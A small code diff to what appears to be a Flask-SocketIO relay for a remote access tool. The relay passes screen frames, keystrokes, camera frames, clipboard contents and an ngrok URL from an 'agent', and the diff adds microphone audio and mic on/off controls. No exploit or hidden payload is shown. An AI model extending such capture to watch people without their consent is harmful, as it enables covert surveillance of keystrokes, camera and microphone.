@@ -97,7 +97,7 @@ def _make_fwd(event):
     _handler.__name__ = f"fwd_{event}"
     return _handler
 
-for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url"):
+for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url", "audio"):
     socketio.on(_ev)(_make_fwd(_ev))
 
 
@@ -125,6 +125,16 @@ def on_camera_on(data):
 @socketio.on("camera_off")
 def on_camera_off(data):
     _to_agent(data, "camera_off")
+
+
+@socketio.on("mic_on")
+def on_mic_on(data):
+    _to_agent(data, "mic_on")
+
+
+@socketio.on("mic_off")
+def on_mic_off(data):
+    _to_agent(data, "mic_off")
 
 
 # ── Process list (request/response) ──────────────────────────────────────────
